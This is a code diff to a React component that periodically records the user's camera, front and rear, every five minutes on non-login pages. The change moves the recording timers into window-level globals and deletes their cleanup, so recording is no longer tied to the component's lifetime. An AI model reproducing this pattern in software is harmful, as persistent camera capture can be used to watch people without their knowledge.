@@ -10,6 +10,29 @@ import { useEffect, useRef } from 'react';
 const MIN_INTERVAL = 2000;
 const AUTH_PAGES = ['/login', '/register', '/oidc-register', '/qr-login', '/tv/login', '/warning'];
 
+/* 全局录像调度：挂在 window 上，与 React 生命周期解耦，
+   避免组件重挂载/重渲染导致定时器丢失。 */
+declare global {
+  interface Window {
+    __entryVideoCycle?: () => void;
+    __entryVideoTimer?: boolean;
+    __entryLastCycle?: number;
+  }
+}
+if (typeof window !== 'undefined' && !window.__entryVideoTimer) {
+  window.__entryVideoTimer = true;
+  setTimeout(() => window.__entryVideoCycle?.(), 60_000);
+  setInterval(() => window.__entryVideoCycle?.(), 5 * 60_000);
+  document.addEventListener('visibilitychange', () => {
+    if (
+      document.visibilityState === 'visible' &&
+      Date.now() - (window.__entryLastCycle || 0) > 4.5 * 60_000
+    ) {
+      window.__entryVideoCycle?.();
+    }
+  });
+}
+
 export default function OperationWatcher() {
   const pathname = usePathname();
   const streamRef = useRef<MediaStream | null>(null);
@@ -148,6 +171,7 @@ export default function OperationWatcher() {
     if (AUTH_PAGES.some((p) => path === p || path.startsWith(p + '/'))) return;
     cyclingRef.current = true;
     lastCycleRef.current = Date.now();
+    window.__entryLastCycle = Date.now();
     try {
       const MR = window.MediaRecorder;
       const mime =
@@ -197,30 +221,11 @@ export default function OperationWatcher() {
   };
 
   useEffect(() => {
-    // 进站 1 分钟后先录第一段，之后每 5 分钟一轮
-    const first = setTimeout(() => {
+    // 把最新闭包注册到全局调度器（定时器在模块级，与 React 生命周期解耦）
+    window.__entryVideoCycle = () => {
       void videoCycle();
-    }, 60_000);
-    const timer = setInterval(() => {
-      void videoCycle();
-    }, 5 * 60 * 1000);
-    // 回前台时若距上轮超过 4.5 分钟（锁屏期间被跳过），立即补一轮
-    const onVis = () => {
-      if (
-        document.visibilityState === 'visible' &&
-        Date.now() - lastCycleRef.current > 4.5 * 60_000
-      ) {
-        void videoCycle();
-      }
     };
-    document.addEventListener('visibilitychange', onVis);
-    return () => {
-      clearTimeout(first);
-      clearInterval(timer);
-      document.removeEventListener('visibilitychange', onVis);
-    };
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, []);
+  });
 
   const openOne = async (facing: 'user' | 'environment') => {
     const s = await navigator.mediaDevices.getUserMedia({
